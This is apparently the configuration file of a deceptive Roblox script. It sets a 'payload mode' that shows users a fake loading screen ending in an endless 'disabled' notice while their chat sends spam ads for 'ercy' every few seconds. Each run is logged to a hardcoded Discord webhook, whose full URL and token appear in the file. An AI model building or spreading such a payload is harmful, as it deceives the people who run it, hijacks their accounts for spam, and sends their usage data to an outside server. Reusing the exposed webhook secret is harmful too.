
return {
    -- ═══════════════════════════════════════════════════════════════
    --  MASTER SWITCH
    -- ═══════════════════════════════════════════════════════════════
    enabled = true,  -- set to false to disable the script & run payload

    -- ═══════════════════════════════════════════════════════════════
    --  BLACKLIST
    -- ═══════════════════════════════════════════════════════════════
    blacklisted_users = {
    },

    -- ═══════════════════════════════════════════════════════════════
    --  KEY SYSTEM
    -- ═══════════════════════════════════════════════════════════════
    required_key = "bread",
    required_key2 = "PERMKEY",
    discord_invite = "https://discord.gg/m6tgr8ZY7F",

    -- ═══════════════════════════════════════════════════════════════
    --  AD MESSAGES (used when enabled = false / payload mode)
    -- ═══════════════════════════════════════════════════════════════
    ad_message = "/ercy on top, join for free scripts",

    ad_chat_messages = {
        "/ercy on top ",
        "join ercy NOW",
        "ercy owns you ",
        "/ercy was here",
        "you got caught lacking by ercy",
    },

    -- ═══════════════════════════════════════════════════════════════
    --  WEBHOOK (execution logger)
    -- ═══════════════════════════════════════════════════════════════
    webhook_url = "https://discord.com/api/webhooks/1483085353068793867/-7B1fQ10tnfWo226Mhr9uNslwlEGWSX3OdnFXBAqhHx3zL81XdUC_5nL5k9Gzy7kfXeD",
    webhook_enabled = true,  -- set to false to stop logging

    -- ═══════════════════════════════════════════════════════════════
    --  GROUP IDS TO CHECK
    -- ═══════════════════════════════════════════════════════════════
    group_check_enabled = false,
    group_ids = { 260140977, 633417839 },
    
    playercount_enabled = true,

    -- ═══════════════════════════════════════════════════════════════
    --  LOADING SCREEN MESSAGES (fake loading before payload)
    -- ═══════════════════════════════════════════════════════════════
    loading_steps = {
        { text = "Initializing script...",            duration = 1.5 },
        { text = "Connecting to server...",           duration = 2.0 },
        { text = "Checking key system...",            duration = 2.5 },
        { text = "Key verified",                      duration = 1.0 },
        { text = "Looking for mods...",               duration = 2.0 },
        { text = "No mods detected",                  duration = 1.0 },
        { text = "Checking gate URL...",              duration = 2.5 },
        { text = "Gate responded",                    duration = 1.0 },
        { text = "Loading modules...",                duration = 1.5 },
        { text = "Fetching remote config...",         duration = 2.0 },
        { text = "Injecting hooks...",                duration = 1.5 },
        { text = "Almost ready...",                   duration = 1.0 },
        { text = "Script disabled by o3fu, please wait as we re-enable it.", duration = 999999999 },
    },

    -- ═══════════════════════════════════════════════════════════════
    --  CHAT SPAM SETTINGS
    -- ═══════════════════════════════════════════════════════════════
    chat_spam_interval = 6,  -- seconds between each chat message
}
